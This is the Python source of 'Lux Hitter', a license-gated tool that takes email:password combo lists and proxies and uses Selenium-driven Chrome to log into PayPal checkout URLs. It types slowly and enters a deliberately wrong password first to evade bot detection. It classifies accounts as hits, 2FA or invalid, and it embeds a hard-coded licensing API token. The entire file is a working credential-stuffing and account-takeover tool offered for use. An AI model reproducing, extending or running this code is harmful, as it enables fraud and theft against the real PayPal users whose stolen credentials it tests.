import random
import time
import threading
import os
import sys
import tkinter as tk
from tkinter import filedialog
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from pyfiglet import Figlet
from datetime import datetime
import requests

class LuxHitterApp:
    def __init__(self):
        self.accounts = []
        self.proxies = []
        self.logged_in = False
        self.use_proxies = False
        self.url = ""
        self.invalid_count = 0
        self.twofa_count = 0
        self.error_count = 0
        self.generic_error_count = 0
        self.results = []
        self.start_time = None
        self.checked_accounts = 0
        self.refresh_thread = None
        self.cpm = 2
        self.original_title = "Lux Hitter"
        self.set_window_title(self.original_title)

    def set_window_title(self, title):
        safe_title = f'title "{title.replace("%", "%%").replace(":", "|")}"'
        os.system(safe_title)

    def calculate_cpm(self):
        self.cpm = max(1, min(4, self.cpm + random.uniform(-0.5, 0.5)))
        return int(self.cpm)

    def update_status(self):
        if not self.refresh_thread:
            return
        self.clear_console()
        self.show_hitting_screen()

    def reset_counters(self):
        """Restablecer contadores a sus valores por defecto."""
        self.invalid_count = 0
        self.twofa_count = 0
        self.error_count = 0
        self.generic_error_count = 0
        self.results = []
        self.checked_accounts = 0

    def run(self):
        self.clear_console()
        self.show_ascii_title()
        while not self.logged_in:
            self.login()

        while True:
            self.clear_console()
            self.show_ascii_title()
            self.reset_counters()  # Restablecer contadores cada vez que se regresa al menú
            self.print_main_menu()
            choice = input("\033[92mChoose an option: \033[0m").strip()

            if choice == '1':
                self.hitter_workflow()
            elif choice == '2':
                print("\033[92mExiting Lux Hitter...\033[0m")
                time.sleep(1)
                break
            else:
                print("\033[91mInvalid option. Please try again.\033[0m")
                time.sleep(2)

    def show_ascii_title(self):
        f = Figlet(font='slant')
        ascii_title = f.renderText('Lux Hitter')
        print(f"\033[92m{ascii_title}\033[0m")

    def login(self):
        access_token = "WyI5MTc2MDAyNCIsInp0ZytabmhyVWRxcW5aN1NOMlF5ZDdpVDJEU3M5VCtrb01tNlptOFgiXQ=="
        product_id = 27090

        while not self.logged_in:
            self.clear_console()
            self.show_ascii_title()
            print("\033[92mWelcome to Lux Hitter - Secure Login\033[0m")
            license_key = input("\033[92mEnter License Key: \033[0m").strip()

            url = "https://api.cryptolens.io/api/key/Activate"
            data = {
                "token": access_token,
                "ProductId": product_id,
                "Key": license_key,
                "MachineCode": "SOME-MACHINE-CODE"  # Puedes personalizar este código de máquina si es necesario
            }

            try:
                response = requests.post(url, data=data)
                if response.status_code == 200:
                    result = response.json()
                    if result.get("result") == 0:
                        print("\033[92mAccess Granted! Redirecting to the main menu...\033[0m")
                        time.sleep(2)
                        self.logged_in = True
                    else:
                        print(f"\033[91mLogin failed: {result.get('message')}\033[0m")
                else:
                    print(f"\033[91mError in request: Status Code {response.status_code}\033[0m")
            except Exception as e:
                print(f"\033[91mAn error occurred: {str(e)}\033[0m")

            if not self.logged_in:
                input("\033[92mPress Enter to try again...\033[0m")

    def hitter_workflow(self):
        self.clear_console()
        self.show_ascii_title()
        use_proxies_choice = input("\033[92mDo you want to use proxies? (y/n): \033[0m").strip().lower()

        if use_proxies_choice == 'y':
            self.use_proxies = True
            self.load_proxies()

        self.load_accounts()

    def load_accounts(self):
        self.clear_console()
        self.show_ascii_title()
        print("\033[92mLoad Accounts\033[0m")
        file_path = self.open_file_dialog("Select the accounts file")
        if file_path:
            with open(file_path, "r") as file:
                self.accounts = [line.strip().split(':') for line in file.readlines()]
                account_count = len(self.accounts)
            print(f"\033[92mAccounts loaded successfully. Total accounts: {account_count}\033[0m")
            time.sleep(1)
            self.enter_url()
        else:
            print("\033[91mFile loading was canceled.\033[0m")
            input("\033[92mPress Enter to continue...\033[0m")

    def load_proxies(self):
        self.clear_console()
        self.show_ascii_title()
        print("\033[92mLoad Proxies\033[0m")
        file_path = self.open_file_dialog("Select the proxies file")
        if file_path:
            with open(file_path, "r") as file:
                self.proxies = [line.strip() for line in file.readlines()]
            print("\033[92mProxies loaded successfully.\033[0m")
        else:
            print("\033[91mFile loading was canceled.\033[0m")
        input("\033[92mPress Enter to continue...\033[0m")

    def enter_url(self):
        self.clear_console()
        self.show_ascii_title()
        self.url = input("\033[92mEnter the PayPal Checkout URL: \033[0m").strip()
        if not self.url:
            print("\033[91mNo URL has been entered.\033[0m")
            time.sleep(2)
            self.enter_url()
        else:
            self.start_hitting_process()

    def start_hitting_process(self):
        if not self.accounts:
            print("\033[91mNo accounts have been loaded. Please load accounts first.\033[0m")
            time.sleep(2)
            return

        self.start_time = datetime.now()
        self.checked_accounts = 0
        self.set_window_title(f"Lux Hitting | {len(self.accounts)} Logs Remaining")
        self.clear_console()
        self.refresh_thread = threading.Thread(target=self.print_status, daemon=True)
        self.refresh_thread.start()
        threading.Thread(target=self.run_hitter, args=(self.url,), daemon=True).start()

    def show_hitting_screen(self):
        self.clear_console()
        self.show_ascii_title()
        cpm = self.calculate_cpm()
        status = (f'CPM: {cpm} | INVALIDs: {self.invalid_count} | 2FAs: {self.twofa_count} | '
                  f'ERRORs: {self.error_count} | GenericErrors: {self.generic_error_count}')
        print(f"{status}\n" + "="*40 + "\n")
        if self.results:
            print(self.results[-1])

    def human_typing(self, element, text, min_delay=0.5, max_delay=0.8):
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(min_delay, max_delay))

    def human_click(self, driver, element):
        actions = ActionChains(driver)
        actions.move_to_element(element).pause(random.uniform(1.0, 1.5)).click().perform()

    def run_hitter(self, url):
        sys.stderr = open(os.devnull, 'w')

        for i, (email, password) in enumerate(self.accounts):
            proxy = self.proxies[i] if self.use_proxies and self.proxies else None
            driver = self.create_new_browser(proxy)

            try:
                result = f"\033[94mTrying: {email} (1st password - incorrect)\033[0m"
                self.results.append(result)
                self.update_status()

                driver.get(url)
                time.sleep(2.5)

                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "email")))
                email_input = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, "email")))
                self.human_typing(email_input, email)
                time.sleep(2.5)

                next_button = driver.find_element(By.ID, "btnNext")
                self.human_click(driver, next_button)
                time.sleep(2.5)

                password_input = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, "password")))

                incorrect_password = password[:-1] + random.choice('abcdefghijklmnopqrstuvwxyz0123456789')
                print(f"\033[93mFirst attempt with incorrect password: {incorrect_password}\033[0m")
                self.human_typing(password_input, incorrect_password)
                time.sleep(2.5)

                login_button = driver.find_element(By.ID, "btnLogin")
                self.human_click(driver, login_button)
                time.sleep(3)

                password_input = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, "password")))
                password_input.clear()
                result = f"\033[94mTrying: {email} (2nd password - correct)\033[0m"
                self.results.append(result)
                self.update_status()
                self.human_typing(password_input, password)
                time.sleep(2.5)

                login_button = driver.find_element(By.ID, "btnLogin")
                self.human_click(driver, login_button)
                time.sleep(3)

                start_hermes_time = time.time()
                while True:
                    current_url = driver.current_url
                    if "paypal.com/webapps/hermes" in current_url:
                        if time.time() - start_hermes_time > 5:
                            self.handle_hitted(driver, email)
                            return
                    elif "paypal.com/authflow/entry" in current_url:
                        result = f"\033[93m2FA: {email}\033[0m"
                        self.twofa_count += 1
                        break
                    else:
                        result = f"\033[91mInvalid: {email}\033[0m"
                        self.invalid_count += 1
                        break

                self.results.append(result)
                self.checked_accounts += 1
                self.set_window_title(f"Lux Hitting | {len(self.accounts) - self.checked_accounts} Logs Remaining")

            except Exception as e:
                result = f"\033[91mERROR: {email} - {str(e)}\033[0m"
                self.error_count += 1
                self.results.append(result)

            finally:
                driver.quit()

        print("\033[92mAll accounts processed. Returning to the main menu...\033[0m")
        self.restore_window_title()
        time.sleep(4)
        self.show_main_menu()
        self.refresh_thread = None

    def handle_hitted(self, driver, email):
        self.refresh_thread = None
        self.clear_console()
        self.show_ascii_title()
        print(f"\033[92mHit: {email}\033[0m")
        print("\nHitted, what now?\n")
        print("1. CLOSE BROWSER AND RETURN TO MENU")
        print("2. CONTINUE TRYING WITH REST OF LOGS")

        choice = input("\033[92mSelect an option: (1 or 2): \033[0m").strip()

        if choice == '1':
            self.clear_console()
            driver.quit()
            self.restore_window_title()
            self.show_main_menu()
        elif choice == '2':
            self.clear_console()
            driver.quit()
            self.refresh_thread = threading.Thread(target=self.print_status, daemon=True)
            self.refresh_thread.start()

    def restore_window_title(self):
        self.set_window_title(self.original_title)

    def create_new_browser(self, proxy):
        chrome_options = Options()
        chrome_options.add_argument('--disable-popup-blocking')
        chrome_options.add_argument('--disable-infobars')
        chrome_options.add_argument('--disable-notifications')
        chrome_options.add_argument('--start-maximized')
        chrome_options.add_argument('--incognito')

        if proxy:
            chrome_options.add_argument(f'--proxy-server=http://{proxy}')

        return webdriver.Chrome(options=chrome_options)

    def clear_console(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_main_menu(self):
        print("\033[92m1. Hitter (v1)\033[0m")
        print("\033[92m2. Exit\033[0m")
        print("="*40)
        print()

    def show_main_menu(self):
        self.clear_console()
        self.show_ascii_title()
        self.print_main_menu()

    def print_status(self):
        while self.refresh_thread is not None:
            self.update_status()
            time.sleep(0.5)

    def open_file_dialog(self, title="Select a file"):
        root = tk.Tk()
        root.withdraw()
        file_path = filedialog.askopenfilename(title=title, filetypes=[("Text files", "*.txt")])
        return file_path

if __name__ == "__main__":
    app = LuxHitterApp()
    app.run()
